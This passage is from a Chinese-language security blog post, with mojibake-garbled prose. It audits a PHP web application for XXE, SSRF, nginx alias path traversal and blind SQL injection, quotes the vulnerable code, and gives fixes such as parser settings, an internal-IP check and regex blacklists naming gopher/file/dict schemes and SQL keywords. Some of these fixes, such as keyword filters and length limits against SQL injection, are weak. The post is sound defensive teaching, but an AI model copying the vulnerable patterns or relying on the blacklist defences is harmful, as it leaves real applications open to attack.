$(&quot;.msg&quot;).text(&#x27;submit&#x27; + &quot;success!&quot;);                    &#125;                &#125;,            &#125;);</code></pre><p>ä¸Šé¢çš„ä¸¤ç«¯ä»£ç ï¼Œä¸€ä¸ªæ˜¯å‰ç«¯çš„æ•°æ®ä¼ é€ï¼Œä¸€ä¸ªæ˜¯åç«¯çš„æ•°æ®å¤„ç†</p><p>å¯ä»¥çœ‹åˆ°å‰ç«¯å°†ç”¨æˆ·æäº¤çš„æ•°æ®ä¸€xmlæ ¼å¼ä»¥postæ–¹å¼å‘é€ç»™åç«¯ï¼Œè€Œåœ¨åç«¯ä¸­ä½¿ç”¨äº†<code>$xmlfile = file_get_contents(&#39;php://input&#39;);</code>ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œä¸ä»…ä½¿ç”¨äº†file_get_contentsï¼Œè€Œä¸”ä½¿ç”¨äº†phpä¼ªåè®®<code>php://input</code>ï¼Œè¿™ä¸ªåè®®å¯ä»¥è¯»å–ç”¨æˆ·ç”¨postæ–¹å¼æäº¤çš„æ•°æ®ï¼Œè¿™å°±æ„å‘³ç€æ”»å‡»è€…å¯ä»¥ä½¿ç”¨æŠ“åŒ…çš„æ–¹å¼ä¿®æ”¹è‡ªå·±æ‰€æäº¤çš„æ•°æ®ï¼Œä»è€Œå¼•å…¥å¤–éƒ¨å®ä½“ï¼Œé€ æˆXXEæ¼æ´ï¼Œè€Œæœ€ä¸»è¦çš„åŸå› æ˜¯è¿™æ®µä»£ç ï¼Œè¿™ä¸ªå‡½æ•°å‚æ•°ä¼ªtrueæ—¶ï¼Œå°±æ˜¯ç¦æ­¢å¼•å…¥å¤–éƒ¨å®ä½“ï¼Œè€Œè¿™é‡Œé€‰æ‹©äº†false</p><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">libxml_disable_entity_loader</span>(<span class="hljs-variable"><span class="hljs-literal">false</span></span>)</span></code></pre><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210330213939369.png" alt="image-20210330213939369" style="zoom:67%;"><h3 id="æ¼æ´é˜²å¾¡-1"><a href="#æ¼æ´é˜²å¾¡-1" class="headerlink" title="æ¼æ´é˜²å¾¡"></a>æ¼æ´é˜²å¾¡</h3><ul><li><p><strong>æ–¹æ³•ä¸€</strong></p><p>ä½¿ç”¨æ‰€å¼€å‘çš„è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•</p><p>phpä¸­çš„æ˜¯</p><p>ä¹Ÿå°±æ˜¯è¿™ä¸ªæ¼æ´çš„é˜²å¾¡æ–¹æ³•</p><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">libxml_disable_entity_loader</span>(<span class="hljs-variable"><span class="hljs-literal">true</span></span>);</span></code></pre><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420141804839.png" alt="image-20210420141804839" style="zoom: 80%;"><p>java:</p></li></ul><pre><code class="hljs reasonml">  DocumentBuilderFactory dbf =<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DocumentBuilderFactory</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>;dbf.set<span class="hljs-constructor">ExpandEntityReferences(<span class="hljs-params">false</span>)</span>;</code></pre><p>  python:</p>  <pre><code class="hljs routeros"><span class="hljs-keyword">from</span> lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(<span class="hljs-attribute">resolve_entities</span>=<span class="hljs-literal">False</span>))</code></pre><ul><li><p><strong>æ–¹æ³•äºŒ</strong></p><p>ä»£ç å±‚é¢çš„é˜²å¾¡ï¼Œåœ¨ä»£ç ä¸­æ·»åŠ å¯¹ç”¨æˆ·æäº¤æ•°æ®çš„æ£€æµ‹å‡½æ•°</p><p>æ¯”å¦‚</p><pre><code class="hljs erlang-repl">&lt;!DOCTYPEå’Œ&lt;!ENTITYï¼Œæˆ–è€…ï¼ŒSYSTEMå’ŒPUBLIC</code></pre><p>ä¸Šé¢çš„å…³é”®è¯æ˜¯XMlå®ä½“ä¸­ä¸å¯ç¼ºå°‘çš„å…³é”®è¯ï¼Œæ‰€ä»¥è¿‡æ»¤åï¼Œå¯ä»¥å¤§æ¦‚ç‡çš„é˜²æ­¢XXEæ”»å‡»</p></li></ul><h2 id="3-SSRF-1"><a href="#3-SSRF-1" class="headerlink" title="3.SSRF"></a>3.SSRF</h2><h3 id="ä»£ç åˆ†æ-2"><a href="#ä»£ç åˆ†æ-2" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h3><p>ä»£ç ä½ç½®<code>application\info\controller\Index.php</code></p><pre><code class="hljs php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable">$url</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$url</span>) || <span class="hljs-variable">$url</span> == <span class="hljs-string">&#x27;&#x27;</span>) &#123;            <span class="hljs-variable">$url</span> = <span class="hljs-string">&#x27;https://sunzy.icu&#x27;</span>;        &#125;        <span class="hljs-variable">$url</span> = <span class="hljs-string">&#x27;https://sunzy.icu&#x27;</span>;        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$url</span>) &#123;            <span class="hljs-variable">$ch</span> = curl_init();            curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);            curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);            curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);            curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="hljs-literal">false</span>);            curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span class="hljs-literal">false</span>);            <span class="hljs-variable">$co</span> = curl_exec(<span class="hljs-variable">$ch</span>);            curl_close(<span class="hljs-variable">$ch</span>);            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$co</span>;        &#125;<span class="hljs-comment">//        return view();</span>    &#125;</code></pre><p>åœ¨ä¸Šé¢çš„ä»£ç ä¸­ï¼Œéœ€è¦æ¥æ”¶ä¸€ä¸ªå‚æ•°<code>url</code>ï¼Œå¦‚æœå‚æ•°ä¸ºç©ºï¼Œåˆ™èµ‹å€¼ä¸º<code>https://sunzy.icu</code>ï¼Œå¦åˆ™ç›´æ¥è¿›è¡Œcurlåˆå§‹åŒ–ï¼Œç„¶åè¿›è¡Œè®¿é—®ï¼Œå¯ä»¥çœ‹åˆ°æ²¡æœ‰å¯¹æäº¤çš„å‚æ•°è¿›è¡Œä»»ä½•çš„æ£€æŸ¥å’Œè¿‡æ»¤ï¼Œè¿™æ˜¯å¾ˆå±é™©çš„ã€‚</p><h3 id="æ¼æ´é˜²å¾¡-2"><a href="#æ¼æ´é˜²å¾¡-2" class="headerlink" title="æ¼æ´é˜²å¾¡"></a>æ¼æ´é˜²å¾¡</h3><ul><li><strong>æ–¹æ³•ä¸€</strong></li></ul><p>é»‘åå• å†…ç½‘è¿‡æ»¤ï¼Œç«¯å£é™åˆ¶ï¼Œåè®®é™åˆ¶åªå…è®¸ä½¿ç”¨http/https</p><p>åœ¨è¿™ä¸ªç³»ç»Ÿä¸­é˜²å¾¡è¯¥SSRFæ¼æ´å…¶å®éå¸¸ç®€å•ï¼Œå°±æ˜¯ç¦æ­¢æäº¤å‚æ•°ï¼Œæˆ–è€…ç»‘å®šå‚æ•°ä»£ç å¦‚ä¸‹</p><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_inner_ip</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">//åªå…è®¸httpå’Œhttpsåè®®</span>    <span class="hljs-variable">$match_result</span> = preg_match(<span class="hljs-string">&#x27;/^(http|https)?:\/\/.*(\/)?.*$/&#x27;</span>, <span class="hljs-variable">$url</span>);    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$match_result</span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;url fomat error&#x27;</span>);    &#125;    <span class="hljs-keyword">try</span> &#123;        <span class="hljs-variable">$url_parse</span> = parse_url(<span class="hljs-variable">$url</span>);    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;url fomat error&#x27;</span>);    &#125;    <span class="hljs-variable">$hostname</span> = <span class="hljs-variable">$url_parse</span>[<span class="hljs-string">&#x27;host&#x27;</span>];    <span class="hljs-variable">$ip</span> = gethostbyname(<span class="hljs-variable">$hostname</span>);    <span class="hljs-variable">$int_ip</span> = ip2long(<span class="hljs-variable">$ip</span>);    <span class="hljs-comment">//ä¸å…è®¸hostä¸ºå†…ç½‘ipåœ°å€</span>    <span class="hljs-keyword">return</span> ip2long(<span class="hljs-string">&#x27;127.0.0.0&#x27;</span>) &gt;&gt; <span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span> &gt;&gt; <span class="hljs-number">24</span> || ip2long(<span class="hljs-string">&#x27;10.0.0.0&#x27;</span>) &gt;&gt; <span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span> &gt;&gt; <span class="hljs-number">24</span> || ip2long(<span class="hljs-string">&#x27;172.16.0.0&#x27;</span>) &gt;&gt; <span class="hljs-number">20</span> == <span class="hljs-variable">$int_ip</span> &gt;&gt; <span class="hljs-number">20</span> || ip2long(<span class="hljs-string">&#x27;192.168.0.0&#x27;</span>) &gt;&gt; <span class="hljs-number">16</span> == <span class="hljs-variable">$int_ip</span> &gt;&gt; <span class="hljs-number">16</span>;&#125;</code></pre><ul><li><p><strong>æ–¹æ³•äºŒ</strong></p><p>å¯¹äºä¸€èˆ¬çš„SSRFé˜²å¾¡ï¼Œä¸€èˆ¬ä»ä¸€ä¸‹å‡ æ–¹é¢å…¥æ‰‹</p><ul><li><p>é™åˆ¶åè®®ä¸ºHTTPã€HTTPS</p></li><li><p>ä¸ç”¨é™åˆ¶302é‡å®šå‘</p></li><li><p>è®¾ç½®URLç™½åå•æˆ–è€…é™åˆ¶å†…ç½‘IP</p></li><li><p>é™åˆ¶è¯·æ±‚çš„ç«¯å£ä¸ºhttpå¸¸ç”¨çš„ç«¯å£ï¼Œæ¯”å¦‚ï¼Œ80,443,8080,8090</p></li></ul></li></ul><p>ä¸‹é¢æ˜¯è‡ªå·±ç¼–å†™çš„WAF</p><pre><code class="hljs php"><span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;http://baidu.com/test&quot;</span>;<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/file|ftp|tftp|gopher|dict|localhost|127\.0\.0\.1|3232235521|2130706433|0x|0177\.0\.0\.01|0\.0\.0\.0|xip|@/i&quot;</span>,<span class="hljs-variable">$url</span>))&#123;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;you are a hacker!!!&quot;</span>);&#125;</code></pre><p>è§£é‡Šä¸€ä¸‹ä¸ºä»€ä¹ˆè¦ç”¨ä¸Šé¢çš„æ­£åˆ™è¿‡æ»¤url</p><ul><li><p>file|ftp|tftp|gopher|dict</p><p>æ˜¯è®©æ”¹urlåªèƒ½ä½¿ç”¨http/httpsåè®®ï¼Œè¿™æ ·å¯ä»¥é¿å…å¤§éƒ¨åˆ†çš„æ”»å‡»ã€‚</p></li><li><p>localhost|127.0.0.1</p><p>æ˜¯ä¸ºäº†é˜²æ­¢æ”»å‡»è€…æ¢æµ‹å†…ç½‘ç«¯å£ï¼Œä»¥å…æ³„éœ²ä¸€äº›å®¹æ˜“è¢«æ”»å‡»çš„åº”ç”¨ç¨‹åº</p></li><li><p>3232235521|2130706433|0x|0177.0.0.01|0.0.0.0</p><p>è¿™å‡ ä¸ªæ˜¯ä¸ºäº†é˜²æ­¢æ”»å‡»è€…å¯¹127.0.0.1è¿›è¡Œå…«è¿›åˆ¶ï¼Œåå…­è¿›åˆ¶ï¼Œåè¿›åˆ¶çš„è½¬ç ï¼Œä»è€Œç»•è¿‡ä¹‹å‰çš„æ£€æµ‹</p></li><li><p>xip|@</p><p>è¿™ä¸¤ä¸ªæ˜¯é˜²æ­¢æ”»å‡»è€…ä½¿ç”¨302è·³è½¬æ”»å‡»</p></li></ul><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420142252510.png" alt="image-20210420142252510" style="zoom: 33%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420142336577.png" alt="image-20210420142336577" style="zoom: 33%;"></p><h2 id="4-ç›®å½•éå†-1"><a href="#4-ç›®å½•éå†-1" class="headerlink" title="4.ç›®å½•éå†"></a>4.ç›®å½•éå†</h2><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p><code>nginx.conf</code></p><pre><code class="hljs awk">location /files &#123;  autoindex on;        alias  <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/public/u</span>ploads/;&#125;</code></pre><p>filesåå°‘å†™ä¸€ä¸ª/</p><p>è¾“å…¥url<code>http://192.168.164.147/files../</code>æ—¶ï¼Œç›¸å½“äºè®¿é—®çš„æ˜¯<code>/var/www/public/uploads/../</code>ï¼Œæ‰€ä»¥è®¿é—®çš„å°±æ˜¯<code>/var/www/public/</code>ç›®å½•ã€‚</p><h3 id="æ¼æ´é˜²å¾¡-3"><a href="#æ¼æ´é˜²å¾¡-3" class="headerlink" title="æ¼æ´é˜²å¾¡"></a>æ¼æ´é˜²å¾¡</h3><p>è¯¥æ¼æ´ä¿®å¤æ–¹æ³•å¾ˆç®€å•</p><p>ä¿®æ”¹<code>nginx.conf</code></p><pre><code>location /files/ &#123;          autoindex on;        alias  /var/www/public/uploads/;&#125;</code></pre><h2 id="5-SQLæ³¨å…¥"><a href="#5-SQLæ³¨å…¥" class="headerlink" title="5.SQLæ³¨å…¥"></a>5.SQLæ³¨å…¥</h2><h3 id="æ¼æ´ç‚¹ä¸€-5"><a href="#æ¼æ´ç‚¹ä¸€-5" class="headerlink" title="æ¼æ´ç‚¹ä¸€"></a><strong>æ¼æ´ç‚¹ä¸€</strong></h3><h4 id="ä»£ç åˆ†æ-3"><a href="#ä»£ç åˆ†æ-3" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h4><p>ä»£ç ä½ç½®<code>application\change\controller\Changepass.php</code></p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;request-&gt;isPost()) &#123;        <span class="hljs-variable">$account</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;account&#x27;</span>];        <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];        <span class="hljs-variable">$npassword</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;npassword&#x27;</span>];        <span class="hljs-variable">$newpassword</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;newpassword&#x27;</span>];        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$account</span> != <span class="hljs-string">&#x27;&#x27;</span> &amp;&amp; <span class="hljs-variable">$password</span> != <span class="hljs-string">&#x27;&#x27;</span> &amp;&amp; <span class="hljs-variable">$npassword</span> != <span class="hljs-string">&#x27;&#x27;</span> &amp;&amp; <span class="hljs-variable">$newpassword</span> !=<span class="hljs-string">&#x27;&#x27;</span>)&#123;            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$npassword</span> === <span class="hljs-variable">$newpassword</span>) &#123;                <span class="hljs-variable">$result</span> = Db::query(<span class="hljs-string">&quot;select `username` from yzn_member where username=&#x27;<span class="hljs-subst">$account</span>&#x27;&quot;</span>);                <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$result</span>)) &#123;                    <span class="hljs-variable">$sql</span> = Db::query(<span class="hljs-string">&quot;select `password`,`encrypt` from yzn_member where username=&#x27;<span class="hljs-subst">$account</span>&#x27;&quot;</span>);                    <span class="hljs-variable">$encrypt</span> = <span class="hljs-variable">$sql</span>[<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;encrypt&#x27;</span>];                    <span class="hljs-variable">$encrypt_password</span> = <span class="hljs-variable">$password</span> . <span class="hljs-variable">$encrypt</span>;                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$sql</span>[<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;password&#x27;</span>] === md5(<span class="hljs-variable">$encrypt_password</span>)) &#123;                        <span class="hljs-variable">$pwd</span> = md5(<span class="hljs-variable">$newpassword</span>.<span class="hljs-variable">$encrypt</span>);                        <span class="hljs-variable">$change</span> = Db::query(<span class="hljs-string">&quot;UPDATE `yzn_member` SET `password`=&#x27;<span class="hljs-subst">$pwd</span>&#x27; WHERE username=&#x27;<span class="hljs-subst">$account</span>&#x27;&quot;</span>);                        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;success(<span class="hljs-string">&quot;successful!&quot;</span>);                    &#125; <span class="hljs-keyword">else</span> &#123;                        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;wrong password!&quot;</span>);                    &#125;                &#125; <span class="hljs-keyword">else</span> &#123;                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;no user!&quot;</span>);                &#125;            &#125;            <span class="hljs-keyword">else</span>&#123;                <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;new password are different!&quot;</span>);            &#125;        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;please input content!!!&quot;</span>);        &#125;    &#125;</code></pre><p>è¿™æ®µä»£ç çš„æ„æ€å°±æ˜¯ï¼Œå…ˆæ£€æŸ¥ç”¨æˆ·çš„è¾“å…¥æ˜¯å¦ä¸ºç©ºï¼Œä¸ä¸ºç©ºåˆ™åˆ¤æ–­ä¸¤æ¬¡è¾“å…¥çš„æ–°å¯†ç æ˜¯å¦ä¸€æ ·ï¼Œä¸€æ ·å…ˆåˆ°æ•°æ®åº“ä¸­æŸ¥æ‰¾è¯¥ç”¨æˆ·ï¼Œå¦‚æœæœ‰è¯¥ç”¨æˆ·ï¼Œåˆ™å–å‡ºè¯¥ç”¨æˆ·çš„å¯†ç å’ŒåŠ å¯†å› å­ï¼Œç„¶ååˆ¤æ–­æ—§å¯†ç æ˜¯å¦æ­£ç¡®ï¼Œæ­£ç¡®åˆ™å°†æ–°å¯†ç å’ŒåŠ å¯†å› å­çš„md5å€¼å†™å…¥æ•°æ®åº“ï¼Œå¯†ç ä¿®æ”¹æˆåŠŸã€‚</p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°å¹¶æ²¡æœ‰è¿”å›æŸ¥è¯¢çš„ä¿¡æ¯ï¼Œä½†æ˜¯ä¹Ÿæ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥çš„æ•°æ®è¿›è¡Œæ£€æŸ¥å’Œè¿‡æ»¤ï¼Œæ‰€ä»¥æ”»å‡»æ ¹æ®é”™è¯¯æç¤ºè¿›è¡Œç›²æ³¨æ”»å‡»ã€‚</p><h4 id="æ¼æ´é˜²å¾¡-4"><a href="#æ¼æ´é˜²å¾¡-4" class="headerlink" title="æ¼æ´é˜²å¾¡"></a>æ¼æ´é˜²å¾¡</h4><ul><li><p><strong>æ–¹æ³•ä¸€</strong></p><p>å¯¹sqlæ³¨å…¥ä½¿ç”¨çš„å…³é”®è¯è¿›è¡Œè¿‡æ»¤ï¼Œå†™ä¸€ä¸ªwafå¯¹è¾“å…¥çš„æ•°æ®è¿›è¡Œæ£€æŸ¥</p><p>è¿™é‡Œçš„è¯åªéœ€è¦å¯¹ç”¨æˆ·åè¿›è¡Œè¿‡æ»¤ï¼Œå› ä¸ºåªæœ‰ç”¨æˆ·åè¢«å¸¦å…¥åˆ°sqlè¯­å¥ä¸­è¿›è¡ŒæŸ¥è¯¢</p><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">inject_check</span>(<span class="hljs-params"><span class="hljs-variable">$Sql_Str</span></span>) </span>&#123;<span class="hljs-comment">//æ£€æµ‹Sqlçš„æ³¨å…¥è¯­å¥ã€‚</span>   <span class="hljs-variable">$check</span>=preg_match(<span class="hljs-string">&#x27;/select|from|where|if|database|order|insert|update|or|group_concat|\&#x27;|\\*|\*|\.\.\/|\.\/|union|and|ascii|substring|sleep/i&#x27;</span>,<span class="hljs-variable">$Sql_Str</span>);    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$check</span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;hacker!!!&quot;</span>)    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-variable">$Sql_Str</span>;    &#125;&#125;</code></pre><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420144316454.png" alt="image-20210420144316454" style="zoom:67%;"><p>å¯ä»¥çœ‹åˆ°ä½¿ç”¨bpè¿›è¡Œæ³¨å…¥fuzzingï¼Œå¯ä»¥å‘ç°å¾ˆå¤špayloadéƒ½å·²ç»è¢«è¿‡æ»¤</p></li><li><p><strong>æ–¹æ³•äºŒ</strong></p><p>ç¬¬ä¸€ç§æ–¹æ³•å¾ˆç®€å•ï¼Œå°±æ˜¯é™åˆ¶ç”¨æˆ·åå’Œå¯†ç çš„é•¿åº¦ï¼Œç„¶åå¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œé•¿åº¦é™åˆ¶</p><p>å› ä¸ºæ˜¯ç”¨æˆ·åå’Œå¯†ç ä½ç½®ï¼Œç”¨æˆ·åçš„é•¿åº¦ä¸€èˆ¬ä¸ä¼šè¶…è¿‡20ä¸ªå­—ç¬¦ï¼Œå¯†ç ä¹Ÿä¸ä¼šè¶…è¿‡20ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆè¿™é‡Œåªéœ€è¦åœ¨ç”¨æˆ·æäº¤å®Œæ•°æ®åï¼Œåœ¨åç«¯æ£€æµ‹ç”¨æˆ·åå’Œå¯†ç çš„é•¿åº¦ï¼Œè¿™æ ·å°±å¯ä»¥è®©sqlæ³¨å…¥æ”»å‡»æ— æ³•å‘æŒ¥å¨åŠ›ï¼Œå› ä¸ºåœ¨20ä¸ªå­—ç¬¦èŒƒå›´ä¹‹å†…å¾ˆéš¾æ„é€ å‡ºæœ‰æ•ˆçš„æ”»å‡»è¯­å¥ã€‚</p></li></ul><h3 id="æ¼æ´ç‚¹äºŒ-5"><a href="#æ¼æ´ç‚¹äºŒ-5" class="headerlink" title="æ¼æ´ç‚¹äºŒ"></a><strong>æ¼æ´ç‚¹äºŒ</strong></h3><h4 id="ä»£ç åˆ†æ-4"><a href="#ä»£ç åˆ†æ-4" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h4><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">jifen</span>(<span class="hljs-params"></span>)</span>&#123;    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;&quot;</span>;    <span class="hljs-variable">$point</span>=<span class="hljs-number">0</span>;    <span class="hljs-variable">$id</span> = <span class="hljs-keyword">$this</span>-&gt;userid;    <span class="hljs-variable">$sql</span> = Db::query(<span class="hljs-string">&quot;select `point` from yzn_member where id=&#x27;<span class="hljs-subst">$id</span>&#x27;&quot;</span>)[<span class="hljs-number">0</span>];    <span class="hljs-variable">$point</span> = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$sql</span>[<span class="hljs-string">&#x27;point&#x27;</span>];    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]!==<span class="hljs-string">&#x27;&#x27;</span>)&#123;        <span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];        <span class="hljs-variable">$num</span> = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num&#x27;</span>];        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> !== <span class="hljs-keyword">$this</span>-&gt;userinfo[<span class="hljs-string">&#x27;username&#x27;</span>] &amp;&amp; <span class="hljs-variable">$num</span> &lt;= <span class="hljs-variable">$point</span>)&#123;            <span class="hljs-variable">$result</span> = Db::query(<span class="hljs-string">&quot;select `point` from yzn_member where username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>)[<span class="hljs-number">0</span>];            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$result</span>))&#123;                <span class="hljs-variable">$new_point</span> = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;point&#x27;</span>] + <span class="hljs-variable">$num</span>;                <span class="hljs-variable">$point</span> = <span class="hljs-variable">$point</span> - <span class="hljs-variable">$num</span>;                Db::query(<span class="hljs-string">&quot;UPDATE `yzn_member` SET `point`=&#x27;<span class="hljs-subst">$point</span>&#x27; WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27;&quot;</span>);                Db::query(<span class="hljs-string">&quot;UPDATE `yzn_member` SET `point`=&#x27;<span class="hljs-subst">$new_point</span>&#x27; WHERE username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>);                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;æˆåŠŸå‘&quot;</span>.<span class="hljs-variable">$username</span>.<span class="hljs-string">&quot;èµ é€&quot;</span>.(<span class="hljs-keyword">string</span>)<span class="hljs-variable">$num</span>.<span class="hljs-string">&quot;ç§¯åˆ†!&quot;</span>;                <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch(<span class="hljs-string">&#x27;/jifen&#x27;</span>,[<span class="hljs-string">&#x27;point&#x27;</span>=&gt;<span class="hljs-variable">$point</span>,<span class="hljs-string">&#x27;msg&#x27;</span>=&gt;<span class="hljs-variable">$msg</span>]);            &#125;<span class="hljs-keyword">else</span>&#123;                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;ä¸å­˜åœ¨è¯¥ç”¨æˆ·ï¼&quot;</span>;                <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch(<span class="hljs-string">&#x27;/jifen&#x27;</span>,[<span class="hljs-string">&#x27;point&#x27;</span>=&gt;<span class="hljs-variable">$point</span>,<span class="hljs-string">&#x27;msg&#x27;</span>=&gt;<span class="hljs-variable">$msg</span>]);            &#125;        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;æ³¨æ„ç”¨æˆ·åä¸èƒ½æ˜¯è‡ªå·±ä¸”ç§¯åˆ†æ•°ç‚¹æ•°éœ€è¦å°äºè‡ªå·±å½“å‰ç§¯åˆ†!&quot;</span>;            <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch(<span class="hljs-string">&#x27;/jifen&#x27;</span>,[<span class="hljs-string">&#x27;point&#x27;</span>=&gt;<span class="hljs-variable">$point</span>,<span class="hljs-string">&#x27;msg&#x27;</span>=&gt;<span class="hljs-variable">$msg</span>]);        &#125;    &#125;</code></pre><p>åœ¨è¿™æ®µä»£ç ä¸­ä¼šå°†ç”¨æˆ·æäº¤çš„ç”¨æˆ·åå¸¦åˆ°sqlè¯­å¥ä¸­æŸ¥è¯¢</p><pre><code class="hljs php"><span class="hljs-variable">$result</span> = Db::query(<span class="hljs-string">&quot;select `point` from yzn_member where username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>)[<span class="hljs-number">0</span>];</code></pre><p>è™½ç„¶æ­¤å¤„æ²¡æœ‰è¿”å›å€¼ï¼Œä½†æ˜¯å¦‚æœæŸ¥è¯¢å¤±è´¥å°±ä¼šæç¤º<code>$msg=&quot;ä¸å­˜åœ¨è¯¥ç”¨æˆ·ï¼&quot;</code>ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥ä½¿ç”¨ç›²æ³¨æ”»å‡»</p><h4 id="æ¼æ´é˜²å¾¡-5"><a href="#æ¼æ´é˜²å¾¡-5" class="headerlink" title="æ¼æ´é˜²å¾¡"></a>æ¼æ´é˜²å¾¡</h4><p>åŒæ ·å¯ä»¥ç›´æ¥ä½¿ç”¨ä¸Šé¢çš„è¿‡æ»¤å‡½æ•°</p><h3 